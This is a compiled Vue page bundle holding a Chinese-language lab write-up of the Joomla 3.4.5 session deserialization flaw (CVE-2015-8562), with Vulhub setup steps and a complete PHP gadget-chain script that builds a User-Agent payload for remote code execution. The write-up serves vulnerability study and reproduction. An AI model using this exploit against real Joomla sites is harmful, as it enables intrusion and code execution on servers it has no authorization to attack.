import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c as l,a as n,b as s,d as e,e as t}from"./app-58e4a7d6.js";const c={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"本漏洞根源是PHP5.6.13前的版本在读取存储好的session时，如果反序列化出错则会跳过当前一段数据而去反序列化下一段数据。而Joomla将session存储在Mysql数据库中，编码是utf8，当我们插入4字节的utf8数据时则会导致截断。截断后的数据在反序列化时就会失败，最后触发反序列化漏洞。",-1),d=n("p",null,"通过Joomla中的Gadget，可造成任意代码执行的结果。",-1),k=n("p",null,"详情可参考：",-1),v={href:"https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html",target:"_blank",rel:"noopener noreferrer"},b=t(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Joomla 1.5.x, 2.x, and 3.x before 3.4.6
PHP 5.6 &lt; 5.6.13, PHP 5.5 &lt; 5.5.29 and PHP 5.4 &lt; 5.4.45
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub启动测试环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动后访问<code>http://your-ip:8080/</code>即可看到Joomla的安装界面，当前环境的数据库信息为：</p><ul><li>数据库地址：mysql:3306</li><li>用户：root</li><li>密码：root</li><li>数据库名：joomla</li></ul><p>填入上述信息，正常安装即可。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>然后我们不带User-Agent头，先访问一次目标主页，记下服务端返回的Cookie：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/2-168180288501438.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,11),m={href:"http://sandbox.onlinephpfunctions.com/code/17e7080841ccce12f6c6e0bb1de01b9e390510bd",target:"_blank",rel:"noopener noreferrer"},h=t(`<div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">JSimplepieFactory</span> <span class="token punctuation">{</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">JDatabaseDriverMysql</span> <span class="token punctuation">{</span>

<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">SimplePie</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> <span class="token variable">$sanitize</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token variable">$cache</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token variable">$cache_name_function</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token variable">$javascript</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token variable">$feed_url</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">feed_url</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;phpinfo();JFactory::getConfig();exit;&quot;</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">javascript</span> <span class="token operator">=</span> <span class="token number">9999</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cache_name_function</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;assert&quot;</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sanitize</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JDatabaseDriverMysql</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cache</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">JDatabaseDriverMysqli</span> <span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$disconnectHandlers</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSimplepieFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimplePie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">connection</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">disconnectHandlers</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;init&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JDatabaseDriverMysqli</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$poc</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token variable">$poc</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;\\x00*\\x00&quot;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;\\\\0\\\\0\\\\0&#39;</span><span class="token punctuation">,</span> <span class="token variable">$poc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;123}__test|<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$poc</span><span class="token punctuation">}</span></span>\\xF0\\x9D\\x8C\\x86&quot;</span><span class="token punctuation">;</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/1-168180288501439.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>将生成好的POC作为User-Agent，带上第一步获取的Cookie发包，这一次发包，脏数据进入Mysql数据库。然后同样的包再发一次，我们的代码被执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/3-168180288501440.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,4);function g(_,f){const a=o("ExternalLinkIcon");return i(),l("div",null,[r,u,d,k,n("ul",null,[n("li",null,[n("a",v,[s("https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html"),e(a)])])]),b,n("p",null,[s("再用如下脚本生成POC：（"),n("a",m,[s("在线运行"),e(a)]),s("）")]),h])}const w=p(c,[["render",g],["__file","Joomla 3.4.5 反序列化漏洞 CVE-2015-8562.html.vue"]]);export{w as default};
